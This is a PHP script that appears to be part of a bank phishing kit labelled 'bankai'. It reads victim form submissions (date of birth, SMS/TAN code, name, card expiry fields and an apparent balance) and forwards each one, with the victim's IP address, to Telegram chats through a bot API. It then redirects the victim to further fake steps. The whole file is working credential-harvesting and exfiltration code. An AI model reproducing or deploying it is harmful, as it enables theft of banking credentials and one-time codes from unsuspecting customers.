<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();
require 'config.php';

$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['tt'])) {
    $text = urlencode("
    | bankai d naissance - $ip
    +--------------------------------------------------
    | date : ".$_POST['tt']." | ".$_POST['mm']." | ".$_POST['jjjj']."
    +--------------------------------------------------
    ");

    foreach ($chat_ids as $id) {
        $link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
        hit($link);
    }

    header("Location: step4.php");
    exit();
}

if (isset($_POST['tan'])) {
    $text = urlencode("
    | bankai sms - $ip
    +--------------------------------------------------
    | KODE : ".$_POST['tan']."
    +--------------------------------------------------
    ");

    foreach ($chat_ids as $id) {
        $link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
        hit($link);
    }

    header("Location: load-sms.php");
    exit();
}

if (isset($_POST['one'])) {
    $text = urlencode("
    | bankai name - $ip
    +--------------------------------------------------
    | name : ".$_POST['one']."
    | EXP : ".$_POST['2']." | ".$_POST['3']."
    | balin : ".$_POST['4']."
    +--------------------------------------------------
    ");

    foreach ($chat_ids as $id) {
        $link = "https://api.telegram.org/bot$bot/sendMessage?parse_mode=html&chat_id=$id&text=$text";
        hit($link);
    }

    header("Location: load-sms.php");
    exit();
}
?>
